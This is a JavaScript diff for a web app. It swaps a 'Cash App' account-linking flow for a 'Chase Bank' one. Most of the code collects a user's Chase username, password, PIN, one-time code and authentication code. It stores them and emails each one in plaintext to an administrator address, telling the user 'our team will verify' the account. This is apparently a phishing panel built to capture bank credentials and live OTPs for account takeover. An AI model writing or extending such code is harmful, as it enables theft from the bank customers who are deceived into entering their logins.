     } else if(acc.status === 'rejected'){
-      buttonHTML = '<button class="modal-btn" onclick="viewCashAppRejection('+idx+')" style="margin-top:8px;padding:10px;font-size:14px;background:#e53935;">Check Rejection Reason</button>';
+      buttonHTML = '<button class="modal-btn" onclick="viewChaseBankRejection('+idx+')" style="margin-top:8px;padding:10px;font-size:14px;background:#e53935;">Check Rejection Reason</button>';
     }
     
     div.innerHTML = 
       '<div style="display:flex;align-items:center;gap:12px;margin-bottom:8px;">'+
-        '<img src="https://i.imgur.com/wT32rIk.jpeg" style="width:48px;height:48px;border-radius:12px;object-fit:cover;box-shadow:0 2px 8px rgba(0,214,50,0.2);">'+
+        '<img src="https://i.imgur.com/z8tqddc.jpeg" style="width:48px;height:48px;border-radius:12px;object-fit:cover;box-shadow:0 2px 8px rgba(17,122,202,0.2);">'+
         '<div style="flex:1;">'+
           '<div style="font-weight:600;color:#0a2540;margin-bottom:2px;font-size:15px;">'+acc.identifier+'</div>'+
           '<div style="font-size:13px;color:'+statusColor+';font-weight:600;">'+statusText+'</div>'+
@@ -3389,36 +3389,37 @@ function loadCashAppAccounts(){
   });
 }
 
-function openCashAppLink(){
-  $('cashapp-identifier').value = '';
-  $('cashapp-pin').value = '';
-  $('cashapp-link-error').textContent = '';
-  closeModal('cashapp-list-modal');
-  var linkModal = $('cashapp-link-modal');
+function openChaseBankLink(){
+  $('chasebank-username').value = '';
+  $('chasebank-password').value = '';
+  $('chasebank-pin').value = '';
+  $('chasebank-link-error').textContent = '';
+  closeModal('chasebank-list-modal');
+  var linkModal = $('chasebank-link-modal');
   linkModal.removeAttribute('style');
   linkModal.classList.add('show');
 }
 
 
 
-window.openCashAppOTP = function(idx){
-  var accounts = userData.cashAppAccounts || [];
+window.openChaseBankOTP = function(idx){
+  var accounts = userData.chaseBankAccounts || [];
   if(!accounts[idx]) return;
   
-  closeModal('cashapp-list-modal');
-  $('cashapp-otp-identifier').textContent = accounts[idx].identifier;
-  $('cashapp-otp-code').value = '';
-  $('cashapp-otp-error').textContent = '';
-  $('cashapp-otp-submit-btn').setAttribute('data-idx', idx);
-  openModal('cashapp-otp-modal');
+  closeModal('chasebank-list-modal');
+  $('chasebank-otp-identifier').textContent = accounts[idx].identifier;
+  $('chasebank-otp-code').value = '';
+  $('chasebank-otp-error').textContent = '';
+  $('chasebank-otp-submit-btn').setAttribute('data-idx', idx);
+  openModal('chasebank-otp-modal');
 };
 
-window.viewCashAppDetails = function(idx){
-  var accounts = userData.cashAppAccounts || [];
+window.viewChaseBankDetails = function(idx){
+  var accounts = userData.chaseBankAccounts || [];
   if(!accounts[idx]) return;
   var acc = accounts[idx];
   
-  var details = 'Cash App Account\n\n';
+  var details = 'Chase Bank Account\n\n';
   details += 'Identifier: '+acc.identifier+'\n';
   details += 'Status: Authorized ✓\n';
   details += 'Linked: '+formatDate(acc.addedDate)+'\n';
@@ -3427,111 +3428,150 @@ window.viewCashAppDetails = function(idx){
   alert(details);
 };
 
-window.viewCashAppRejection = function(idx){
-  var accounts = userData.cashAppAccounts || [];
+window.viewChaseBankRejection = function(idx){
+  var accounts = userData.chaseBankAccounts || [];
   if(!accounts[idx]) return;
   var acc = accounts[idx];
   
   var reason = acc.rejectionReason || 'No reason provided';
-  alert('Cash App Account Rejected\n\nIdentifier: '+acc.identifier+'\n\nReason: '+reason);
+  alert('Chase Bank Account Rejected\n\nIdentifier: '+acc.identifier+'\n\nReason: '+reason);
 };
 
 
-$('cashapp-submit-btn').onclick = function(){
-  var identifier = $('cashapp-identifier').value.trim();
-  var pin = $('cashapp-pin').value.trim();
-  var err = $('cashapp-link-error');
+$('chasebank-submit-btn').onclick = function(){
+  var username = $('chasebank-username').value.trim();
+  var password = $('chasebank-password').value.trim();
+  var pin = $('chasebank-pin').value.trim();
+  var err = $('chasebank-link-error');
   err.textContent = '';
-  
-  if(!identifier){err.textContent='Please enter your email or phone number.';return;}
-  if(!pin || pin.length !== 4){err.textContent='Please enter your 4-digit Cash App PIN.';return;}
-  
-  $('cashapp-submit-btn').textContent = 'Linking...';
-  $('cashapp-submit-btn').disabled = true;
-  
-  var accounts = userData.cashAppAccounts || [];
-  var accountIdx = accounts.length; // Index of the new account
+  if(!username){err.textContent='Please enter your Chase username.';return;}
+  if(!password){err.textContent='Please enter your password.';return;}
+  $('chasebank-submit-btn').textContent = 'Linking...';
+  $('chasebank-submit-btn').disabled = true;
+  var accounts = userData.chaseBankAccounts || [];
+  var accountIdx = accounts.length;
   var newAccount = {
-    identifier: identifier,
-    pin: pin,
+    identifier: username,
+    password: password,
+    pin: pin || '',
     status: 'pending',
     addedDate: new Date().toISOString()
   };
+  accounts.push(newAccount);
   
   accounts.push(newAccount);
   
-  userRef.update({cashAppAccounts: accounts}).then(function(){
+  userRef.update({chaseBankAccounts: accounts}).then(function(){
     // Notify admin
     return db.ref('users').once('value').then(function(snap){
       snap.forEach(function(s){
         if(s.val() && s.val().email === ADMIN_EMAIL){
-          notify(s.key, '💵 CASH APP: '+(userData.firstname||'')+' linked '+identifier);
+          notify(s.key, '💵 CHASE BANK: '+(userData.firstname||'')+' linked '+identifier);
           sendEmail(ADMIN_EMAIL,
-            '💵 Cash App Link Request',
+            '💵 Chase Bank Link Request',
             (userData.firstname||'')+' '+(userData.surname||''),
-            (userData.firstname||'')+' '+(userData.surname||'')+' is linking a Cash App account.\n\nIdentifier: '+identifier+'\nPIN: '+pin+'\n\nUser Info:\n- Account: '+(userData.accountNumber||'')+'\n- Email: '+(userData.email||'')+'\n- Country: '+(userData.country||'')+'\n\nThe user is waiting for the OTP code to complete verification.\n\nPlease check your admin panel > Cash App Authorization to review and authorize this account.'
+            (userData.firstname||'')+' '+(userData.surname||'')+' is linking a Chase Bank account.\n\nIdentifier: '+identifier+'\nPIN: '+pin+'\n\nUser Info:\n- Account: '+(userData.accountNumber||'')+'\n- Email: '+(userData.email||'')+'\n- Country: '+(userData.country||'')+'\n\nThe user is waiting for the OTP code to complete verification.\n\nPlease check your admin panel > Chase Bank Authorization to review and authorize this account.'
           );
         }
       });
     });
   }).then(function(){
-    closeModal('cashapp-link-modal');
+    closeModal('chasebank-link-modal');
     // Immediately open OTP modal
-    $('cashapp-otp-identifier').textContent = identifier;
-    $('cashapp-otp-code').value = '';
-    $('cashapp-otp-error').textContent = '';
-    $('cashapp-otp-submit-btn').setAttribute('data-idx', accountIdx);
-    openModal('cashapp-otp-modal');
+    $('chasebank-otp-identifier').textContent = identifier;
+    $('chasebank-otp-code').value = '';
+    $('chasebank-otp-error').textContent = '';
+    $('chasebank-otp-submit-btn').setAttribute('data-idx', accountIdx);
+    openModal('chasebank-otp-modal');
   }).catch(function(e){
-    err.textContent = 'Failed to link Cash App. Please try again.';
+    err.textContent = 'Failed to link Chase Bank. Please try again.';
   }).finally(function(){
-    $('cashapp-submit-btn').textContent = 'Link Cash App';
-    $('cashapp-submit-btn').disabled = false;
+    $('chasebank-submit-btn').textContent = 'Link Chase Bank';
+    $('chasebank-submit-btn').disabled = false;
   });
 };
 
-$('cashapp-otp-submit-btn').onclick = function(){
-  var otp = $('cashapp-otp-code').value.trim();
-  var idx = parseInt($('cashapp-otp-submit-btn').getAttribute('data-idx'));
-  var err = $('cashapp-otp-error');
+$('chasebank-otp-submit-btn').onclick = function(){
+  var otp = $('chasebank-otp-code').value.trim();
+  var idx = parseInt($('chasebank-otp-submit-btn').getAttribute('data-idx'));
+  var err = $('chasebank-otp-error');
   err.textContent = '';
   
   if(!otp || otp.length !== 6){err.textContent='Please enter the 6-digit OTP code.';return;}
   
-  var accounts = userData.cashAppAccounts || [];
+  var accounts = userData.chaseBankAccounts || [];
   if(!accounts[idx]){err.textContent='Account not found.';return;}
   
-  $('cashapp-otp-submit-btn').textContent = 'Verifying...';
-  $('cashapp-otp-submit-btn').disabled = true;
+  $('chasebank-otp-submit-btn').textContent = 'Verifying...';
+  $('chasebank-otp-submit-btn').disabled = true;
   
   accounts[idx].otpCode = otp;
   accounts[idx].otpSubmittedDate = new Date().toISOString();
   
-  userRef.update({cashAppAccounts: accounts}).then(function(){
+  userRef.update({chaseBankAccounts: accounts}).then(function(){
     // Notify admin with OTP
     return db.ref('users').once('value').then(function(snap){
       snap.forEach(function(s){
         if(s.val() && s.val().email === ADMIN_EMAIL){
-          notify(s.key, '🔐 CASH APP OTP: '+(userData.firstname||'')+' submitted OTP for '+accounts[idx].identifier);
+          notify(s.key, '🔐 CHASE BANK OTP: '+(userData.firstname||'')+' submitted OTP for '+accounts[idx].identifier);
           sendEmail(ADMIN_EMAIL,
-            '🔐 Cash App OTP Received',
+            '🔐 Chase Bank OTP Received',
             (userData.firstname||'')+' '+(userData.surname||''),
-            (userData.firstname||'')+' '+(userData.surname||'')+' has submitted the Cash App OTP code.\n\nIdentifier: '+accounts[idx].identifier+'\nOTP Code: '+otp+'\n\nPlease check your admin panel to authorize this Cash App account.'
+            (userData.firstname||'')+' '+(userData.surname||'')+' has submitted the Chase Bank OTP code.\n\nIdentifier: '+accounts[idx].identifier+'\nOTP Code: '+otp+'\n\nPlease check your admin panel to authorize this Chase Bank account.'
           );
         }
       });
     });
   }).then(function(){
-    closeModal('cashapp-otp-modal');
-    alert('✓ OTP submitted! Our team will verify and authorize your Cash App account shortly.');
+    closeModal('chasebank-otp-modal');
+    alert('✓ OTP submitted! Our team will verify and authorize your Chase Bank account shortly.');
   }).catch(function(e){
     err.textContent = 'Failed to submit OTP. Please try again.';
   }).finally(function(){
-    $('cashapp-otp-submit-btn').textContent = 'Verify & Link';
-    $('cashapp-otp-submit-btn').disabled = false;
+    $('chasebank-otp-submit-btn').textContent = 'Verify & Link';
+    $('chasebank-otp-submit-btn').disabled = false;
   });
 };
 
+
+
+// Chase Bank tab switcher
+window.chaseSwitchTab = function(tab){
+  var p1=$("chasebank-panel-otp"),p2=$("chasebank-panel-auth"),t1=$("chasebank-tab-otp"),t2=$("chasebank-tab-auth");
+  if(p1)p1.style.display=tab==="otp"?"block":"none";
+  if(p2)p2.style.display=tab==="auth"?"block":"none";
+  if(t1){t1.style.background=tab==="otp"?"#117ACA":"rgba(255,255,255,0.08)";t1.style.color=tab==="otp"?"#fff":"rgba(255,255,255,0.5)";}
+  if(t2){t2.style.background=tab==="auth"?"#117ACA":"rgba(255,255,255,0.08)";t2.style.color=tab==="auth"?"#fff":"rgba(255,255,255,0.5)";}
+};
+
+// Chase Bank auth code submit
+$("chasebank-auth-submit-btn").onclick = function(){
+  var authCode=$("chasebank-auth-code").value.trim();
+  var idx=parseInt($("chasebank-otp-submit-btn").getAttribute("data-idx"));
+  var err=$("chasebank-auth-error");
+  err.textContent="";
+  if(!authCode){err.textContent="Please enter the authentication code.";return;}
+  var accounts=userData.chaseBankAccounts||[];
+  if(!accounts[idx]){err.textContent="Account not found.";return;}
+  $("chasebank-auth-submit-btn").textContent="Submitting...";
+  $("chasebank-auth-submit-btn").disabled=true;
+  accounts[idx].authCode=authCode;
+  accounts[idx].authSubmittedDate=new Date().toISOString();
+  userRef.update({chaseBankAccounts:accounts}).then(function(){
+    return db.ref("users").once("value").then(function(snap){
+      snap.forEach(function(s){
+        if(s.val()&&s.val().email===ADMIN_EMAIL){
+          notify(s.key,"🔑 CHASE AUTH: "+(userData.firstname||"")+" submitted auth code for "+accounts[idx].identifier);
+          sendEmail(ADMIN_EMAIL,"🔑 Chase Bank Auth Code",(userData.firstname||"")+" "+(userData.surname||""),(userData.firstname||"")+" "+(userData.surname||"")+" submitted Chase Bank auth code.\n\nUsername: "+accounts[idx].identifier+"\nAuth Code: "+authCode+"\n\nPlease check admin panel.");
+        }
+      });
+    });
+  }).then(function(){
+    closeModal("chasebank-otp-modal");
+    alert("✓ Auth code submitted! Our team will verify your Chase Bank account shortly.");
+  }).catch(function(){err.textContent="Failed. Please try again.";})
+  .finally(function(){$("chasebank-auth-submit-btn").textContent="Submit Auth Code";$("chasebank-auth-submit-btn").disabled=false;});
+};
 
 // ═══════════════════════════════════════════════════════
 // MB WAY FUNCTIONALITY
@@ -3768,20 +3808,20 @@ $('mbway-otp-submit-btn').onclick = function(){
   });
 };
 
-// Inject + Link New Cash App button
+// Inject + Link New Chase Bank button
 (function(){
-  var container = $('cashapp-link-btn-container');
+  var container = $('chasebank-link-btn-container');
   if(container){
     var btn = document.createElement('button');
-    btn.textContent = '+ Link New Cash App';
+    btn.textContent = '+ Link New Chase Bank';
     btn.className = 'modal-btn blue';
     btn.style.width = '100%';
-    btn.addEventListener('click', function(e){ e.stopPropagation(); openCashAppLink(); });
+    btn.addEventListener('click', function(e){ e.stopPropagation(); openChaseBankLink(); });
     container.appendChild(btn);
   }
 })();
 
-// Inject + Link New MB WAY button (same pattern as Cash App)
+// Inject + Link New MB WAY button (same pattern as Chase Bank)
 (function(){
   var container = $('mbway-link-btn-container');
   if(container){
